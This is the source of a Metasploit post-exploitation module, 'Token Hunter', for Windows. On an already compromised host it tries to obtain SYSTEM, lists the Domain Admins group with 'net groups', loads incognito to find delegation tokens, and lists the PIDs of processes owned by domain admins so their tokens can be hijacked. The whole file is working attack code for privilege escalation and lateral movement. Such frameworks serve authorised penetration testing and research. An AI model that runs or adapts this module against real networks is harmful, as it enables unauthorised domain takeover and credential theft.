##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
      'Name'             => "Windows Gather Enumerate Domain Admin Tokens (Token Hunter)",
      'Description'      => %q{
          This module will identify systems that have a Domain Admin (delegation) token
          on them.  The module will first check if sufficient privileges are present for
          certain actions, and run getprivs for system.  If you elevated privs to system,
          the SeAssignPrimaryTokenPrivilege will not be assigned, in that case try
          migrating to another process that is running as system.  If no sufficient
          privileges are available, the script will not continue.
        },
      'License'         => MSF_LICENSE,
      'Platform'        => ['win'],
      'SessionTypes'    => ['meterpreter'],
      'Author'          => ['Joshua Abraham <jabra[at]rapid7.com>']
    ))
    register_options(
      [
        OptBool.new('GETSYSTEM', [ true, 'Attempt to get SYSTEM privilege on the target host.', true])
      ])
  end

  def get_system
    print_status("Trying to get SYSTEM privilege")
    results = session.priv.getsystem
    if results[0]
      print_status("Got SYSTEM privilege")
    else
      print_error("Could not obtain SYSTEM privileges")
    end
  end

  def priv_check
    if is_system?
      privs = session.sys.config.getprivs
      if privs.include?("SeAssignPrimaryTokenPrivilege") and privs.include?("SeIncreaseQuotaPrivilege")
        return true
      else
        return false
      end
    elsif is_admin?
      return true
    else
      return false
    end
  end

  def get_members(results)
    members = []

    # Usernames start somewhere around line 6
    results = results.slice(6, results.length)
    # Get group members from the output
    results.each do |line|
      line.split("  ").compact.each do |user|
        next if user.strip == ""
        next if user =~ /-----/
        next if user =~ /The command completed successfully/i
        members << user.strip
      end
    end

    return members
  end

  # return the value from the registry
  def reg_getvaldata(key,valname)
    value = nil
    begin
      root_key, base_key = client.sys.registry.splitkey(key)
      open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ)
      value = open_key.query_value(valname).data
      open_key.close
    rescue
    end
    return value
  end

  # extract the primary domain from the registry
  def get_domain
    domain = nil
    begin
      subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
      v_name = "DCName"
      dom_info = reg_getvaldata(subkey, v_name)
      if not dom_info.nil? and dom_info =~ /\./
        foo = dom_info.split('.')
        domain = foo[1].upcase
      else
        print_error("Error parsing output from the registry. (#{dom_info})")
      end
    rescue
      print_error("This host is not part of a domain.")
    end
    return domain
  end

  def run
    if session
      @host_info = session.sys.config.sysinfo
    else
      print_error("Error! The session is not fully loaded yet")
      return
    end

    print_status("Scanning session #{session.sid} / #{session.session_host}")

    # get system, if requested.
    get_system if (session.sys.config.getuid() !~ /SYSTEM/ and datastore['GETSYSTEM'])

    ## Make sure we meet the requirements before running the module
    if not priv_check
      print_error("Abort! Did not pass the priv check")
      return
    end

    # get var
    domain = get_domain

    if domain.nil?
      return
    end

    # load incognito
    session.core.use("incognito") if(! session.incognito)

    if(! session.incognito)
      print_error("Failed to load incognito on #{session.sid} / #{session.session_host}")
      return
    end

    # gather data
    usr_res = cmd_exec("net", "groups \"Domain Admins\" /domain")
    domain_admins = get_members(usr_res.split("\n"))

    domain_admins.each do |da_user|
      #Create a table for domain admin PIDs, users, IPs, and SIDs
      tbl_pids = Rex::Text::Table.new(
        'Header'  => 'Domain admin token PIDs',
        'Indent'  => 1,
        'Columns' => ['sid', 'IP', 'User', 'PID']
      )

      # parse delegation tokens
      res = session.incognito.incognito_list_tokens(0)
      if res
        res["delegation"].split("\n").each do |user|
          ndom,nusr = user.split("\\")
          if not nusr
            nusr = ndom
            ndom = nil
          end

          if ndom == domain and da_user == nusr
            sid = session.sid
            peer = session.session_host
            print_good("Found token for session #{sid}: #{peer} - #{nusr} (Delegation Token)")
          end
        end
      end

      # parse process list
      domain_admin_pids = ""
      session.sys.process.get_processes().each do |proc|
        if (proc['user'] == "#{domain}\\#{da_user}")
          sid = session.sid
          peer = session.session_host
          target_pid = proc['pid']
          tbl_pids << [sid, peer, da_user, target_pid]
          print_good("Found PID on session #{sid}: #{peer} - #{da_user} (PID: #{target_pid})")
        end
      end

      #At the end of the loop, store and print results for this da_user
      if not tbl_pids.rows.empty? and session.framework.db.active
        report_note(
          :host => session.session_host,
          :type => "pid",
          :data => tbl_pids.to_csv
        )
      end
    end
  end
end
